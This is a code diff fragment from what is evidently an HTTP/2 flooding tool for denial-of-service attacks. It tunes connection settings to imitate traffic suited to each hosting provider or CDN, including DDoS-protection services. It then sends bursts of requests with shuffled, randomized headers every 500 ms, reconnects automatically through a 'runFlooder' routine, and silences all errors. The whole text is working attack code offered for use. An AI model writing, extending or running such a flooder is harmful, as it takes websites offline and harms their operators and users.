+    case 'Akamai International B.V.':
+        settings.priority = 1;
+        settings.headerTableSize = 65536;
+        settings.maxConcurrentStreams = 1000;
+        settings.initialWindowSize = 6291456;
+        settings.maxFrameSize = 16384;
+        settings.maxHeaderListSize = 32768;
+        break;
+    case 'Fastly, Inc.':
+    case 'Optitrust GmbH':
+        settings.priority = 0;
+        settings.headerTableSize = 4096;
+        settings.initialWindowSize = 65535;
+        settings.maxFrameSize = 16384;
+        settings.maxConcurrentStreams = 100;
+        settings.maxHeaderListSize = 4294967295;
+        break;
+    case 'Ddos-guard LTD':
+        settings.priority = 1;
+        settings.maxConcurrentStreams = 1;
+        settings.initialWindowSize = 65535;
+        settings.maxFrameSize = 16777215;
+        settings.maxHeaderListSize = 262144;
+        break;
+    case 'Amazon.com, Inc.':
+    case 'Amazon Technologies Inc.':
+        settings.priority = 0;
+        settings.maxConcurrentStreams = 100;
+        settings.initialWindowSize = 65535;
+        settings.maxHeaderListSize = 262144;
+        break;
+    case 'Microsoft Corporation':
+    case 'Vietnam Posts and Telecommunications Group':
+    case 'VIETNIX':
+        settings.priority = 0;
+        settings.headerTableSize = 4096;
+        settings.initialWindowSize = 8388608;
+        settings.maxFrameSize = 16384;
+        settings.maxConcurrentStreams = 100;
+        settings.maxHeaderListSize = 4294967295;
+        break;
+    case 'Google LLC':
+        settings.priority = 0;
+        settings.headerTableSize = 4096;
+        settings.initialWindowSize = 1048576;
+        settings.maxFrameSize = 16384;
+        settings.maxConcurrentStreams = 100;
+        settings.maxHeaderListSize = 137216;
+        break;
+    // Menambahkan ISP baru
+    case 'Alibaba Cloud':
+        settings.priority = 0;
+        settings.headerTableSize = 8192;
+        settings.initialWindowSize = 1048576;
+        settings.maxFrameSize = 16384;
+        settings.maxConcurrentStreams = 200;
+        settings.maxHeaderListSize = 524288;
+        break;
+    case 'DigitalOcean, LLC':
+        settings.priority = 0;
+        settings.headerTableSize = 8192;
+        settings.initialWindowSize = 1048576;
+        settings.maxFrameSize = 16384;
+        settings.maxConcurrentStreams = 150;
+        settings.maxHeaderListSize = 262144;
+        break;
+    case 'Linode, LLC':
+        settings.priority = 1;
+        settings.headerTableSize = 8192;
+        settings.initialWindowSize = 8388608;
+        settings.maxFrameSize = 16384;
+        settings.maxConcurrentStreams = 250;
+        settings.maxHeaderListSize = 512000;
+        break;
+    case 'IBM Cloud':
+        settings.priority = 1;
+        settings.headerTableSize = 10240;
+        settings.initialWindowSize = 16777216;
+        settings.maxFrameSize = 16384;
+        settings.maxConcurrentStreams = 300;
+        settings.maxHeaderListSize = 1048576;
+        break;
+    case 'Hetzner Online':
+        settings.priority = 0;
+        settings.headerTableSize = 4096;
+        settings.initialWindowSize = 2097152;
+        settings.maxFrameSize = 16384;
+        settings.maxConcurrentStreams = 100;
+        settings.maxHeaderListSize = 524288;
+        break;
+    case 'Rackspace':
+        settings.priority = 1;
+        settings.headerTableSize = 8192;
+        settings.initialWindowSize = 1048576;
+        settings.maxFrameSize = 16384;
+        settings.maxConcurrentStreams = 150;
+        settings.maxHeaderListSize = 262144;
+        break;
+    case 'Twitch, Inc.':
+        settings.priority = 0;
+        settings.headerTableSize = 8192;
+        settings.initialWindowSize = 1048576;
+        settings.maxFrameSize = 16384;
+        settings.maxConcurrentStreams = 200;
+        settings.maxHeaderListSize = 524288;
+        break;
+    case 'Oracle Cloud':
+        settings.priority = 0;
+        settings.headerTableSize = 16384;
+        settings.initialWindowSize = 2097152;
+        settings.maxFrameSize = 16384;
+        settings.maxConcurrentStreams = 128;
+        settings.maxHeaderListSize = 1048576;
+        break;
+    case 'Vultr':
+        settings.priority = 0;
+        settings.headerTableSize = 8192;
+        settings.initialWindowSize = 524288;
+        settings.maxFrameSize = 16384;
+        settings.maxConcurrentStreams = 150;
+        settings.maxHeaderListSize = 262144;
+        break;
+    case 'GoDaddy':
+        settings.priority = 1;
+        settings.headerTableSize = 8192;
+        settings.initialWindowSize = 8388608;
+        settings.maxFrameSize = 16384;
+        settings.maxConcurrentStreams = 100;
+        settings.maxHeaderListSize = 512000;
+        break;
+    case 'Bluehost':
+        settings.priority = 1;
+        settings.headerTableSize = 16384;
+        settings.initialWindowSize = 1048576;
+        settings.maxFrameSize = 16384;
+        settings.maxConcurrentStreams = 200;
+        settings.maxHeaderListSize = 524288;
+        break;
+    default:
+        settings.headerTableSize = 65535;
+        settings.maxConcurrentStreams = 1000;
+        settings.initialWindowSize = 6291456;
+        settings.maxHeaderListSize = 261144;
+        settings.maxFrameSize = 16384;
+        break;
+    }
+
+    return settings;
+}
+    
+    let hpack = new HPACK();
+    let client;
+    
+    const clients = [];
+    client = http2.connect(parsedTarget.href, {
+        protocol: "https",
+        createConnection: () => tlsSocket,
+        settings : getSettingsBasedOnISP(isp),
+        socket: tlsSocket,
+    });
+    clients.push(client);
+    client.setMaxListeners(0);
+    
+    const updateWindow = Buffer.alloc(4);
+    updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105, 0);
+    client.on('remoteSettings', (settings) => {
+        const localWindowSize = Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105;
+        client.setLocalWindowSize(localWindowSize, 0);
+    });
+    
+    client.on('connect', () => {
+    client.ping((err, duration, payload) => {
+    });
+
+    client.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('NATRAL'));
+
+});
+    clients.forEach(client => {
+    const intervalId = setInterval(() => {
+        async function sendRequests() {
+            const shuffleObject = (obj) => {
+                const keys = Object.keys(obj);
+                for (let i = keys.length - 1; i > 0; i--) {
+                    const j = Math.floor(Math.random() * (i + 1));
+                    [keys[i], keys[j]] = [keys[j], keys[i]];
+                }
+                const shuffledObj = {};
+                keys.forEach(key => shuffledObj[key] = obj[key]);
+                return shuffledObj;
+            };
+            const randomItem = (array) => array[Math.floor(Math.random() * array.length)];
+            const dynHeaders = shuffleObject({
+            ...(Math.random() < 0.5 && { rhd: [randomItem(rhd)] }),
+                ...(Math.random() < 0.5 && { hd1: [randomItem(hd1)] }),
+                ...randomItem(rateHeaders1),
+                ...randomItem(rateHeaders2),
+                ...randomItem(rateHeaders3),
+                ...randomItem(rateHeaders4),
+                ...dyn,
+                ...allHeaders,
+                ...dyn2,
+                ...(Math.random() < 0.5 ? taoDoiTuongNgauNhien() : {}),
+            });
+
+            const packed = Buffer.concat([
+                Buffer.from([0x80, 0, 0, 0, 0xFF]),
+                hpack.encode(dynHeaders)
+            ]);
+
+            const streamId = 1;
+            const requests = [];
+            let count = 0;
+
+            const increaseRequestRate = async (client, dynHeaders, args) => {
+                if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
+                    for (let i = 0; i < args.Rate ; i++) {
+                        const requestPromise = new Promise((resolve, reject) => {
+                            const req = client.request(dynHeaders, {
+                                weight: Math.random() < 0.5 ? 251 : 231,
+                                depends_on: 0,
+                                exclusive: Math.random() < 0.5 ? true : false,
+                            })
+                            .on('response', response => {
+                                req.close(http2.constants.NO_ERROR);
+                                req.destroy();
+                                resolve();
+                            });
+                            req.on('end', () => {
+                                count++;
+                                if (count === args.time * args.Rate) {
+                                    clearInterval(intervalId);
+                                    client.close(http2.constants.NGHTTP2_CANCEL);
+                                }
+                                reject(new Error('Request timed out'));
+                            });
+
+                            req.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
+                        });
+
+                        const frame = encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20);
+                        requests.push({ requestPromise, frame });
+                    }
+
+                    await Promise.all(requests.map(({ requestPromise }) => requestPromise));
+                }
+            }
+
+            await increaseRequestRate(client, dynHeaders, args);
+        }
+            sendRequests();
+    }, 500);
+});
+
+    
+        client.on("close", () => {
+            client.destroy();
+            tlsSocket.destroy();
+            connection.destroy();
+            return runFlooder();
+        });
+
+        client.on("error", error => {
+            client.destroy();
+            connection.destroy();
+            return runFlooder();
+        });
+        });
+    }
+const StopScript = () => process.exit(1);
+
+setTimeout(StopScript, args.time * 1000);
+
+process.on('uncaughtException', error => {});
+process.on('unhandledRejection', error => {});
+
+
